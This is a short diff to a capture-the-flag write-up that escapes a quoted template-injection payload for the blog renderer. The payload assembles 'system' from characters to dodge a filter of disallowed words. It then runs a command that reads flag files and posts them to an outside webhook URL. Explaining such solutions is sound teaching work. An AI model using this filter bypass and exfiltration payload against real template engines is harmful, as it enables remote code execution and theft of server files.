@@ -629,11 +629,12 @@ Based on `admin.php`, the poem needs to have certain amout of words & lines thus
 
 As for their payload, here are their payload.
 
+{% raw %}
 ```
 {% set cmd = ['s','y','s','t','e','m']|join('') %}
 {{ ['cat /flag* | curl -X POST -d @- https://webhook.site/062c9157-61d7-4417-95f6-dd084c2b0c89'] | map(cmd) }}
-
 ```
+{% endraw %}
 
 They used `set cmd` to by pass the check of words that are disallowed in `config.php`.
 
